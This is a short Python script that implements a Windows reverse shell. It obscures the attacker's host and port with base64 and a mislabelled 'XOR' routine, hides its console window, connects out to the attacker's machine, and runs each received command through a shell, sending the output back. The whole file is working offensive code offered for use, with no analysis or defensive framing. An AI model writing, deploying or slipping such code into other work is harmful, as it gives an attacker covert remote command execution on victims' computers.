import socket 
import subprocess 
import threading 
import base64
import os 
import sys
import ctypes

KEY = b"X" * 32  #KEY FOR XOR
ENCRYPTED_HOST = base64.b64decode("aWFqdmluYHZpaGh2aWg=") # ENCRYPTED HOST (IP ADDRESS OF THE ATTACKER) 
ENCRYPTED_PORT = base64.b64decode("bGxsbA==") # ECRYPTED PORT (PORT OF THE ATTACKER)

#--- FUNCTION TO DECRYPT THE XOR DATA ===

def xor_decrypt(data, key):
    return bytes(a + b for a, b in zip(data, (key * (len(data) // len(key) + 1))[:len(data)]))

HOST = xor_decrypt(ENCRYPTED_HOST, KEY).decode('latin-1') # DECRYPT HOST
#PORT = int(xor_decrypt(ENCRYPTED_PORT, KEY).decode('utf-8'),16) # DECRYPTO PORT
PORT = int(xor_decrypt(ENCRYPTED_PORT , KEY).decode())

user32=ctypes.windll.user32
kernel32=ctypes.windll.kernel32
hwnd=kernel32.GetConsoleWindow()

if hwnd != 10:
    user32.ShowWindow(hwnd, 0)

def reverse_shell():
    try:
        s = socket.socket()
        s.connect((HOST, PORT))

        while True:
            cmd=s.recv(1024).decode()
            if cmd.lower() in ["exit", "quit"]:
                break
            proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            output = proc.stdout.read() + proc.stderr.read()
            s.send(output+ b"\n")
    except: 
        pass 
threading.Thread(target=reverse_shell, daemon=True).start()
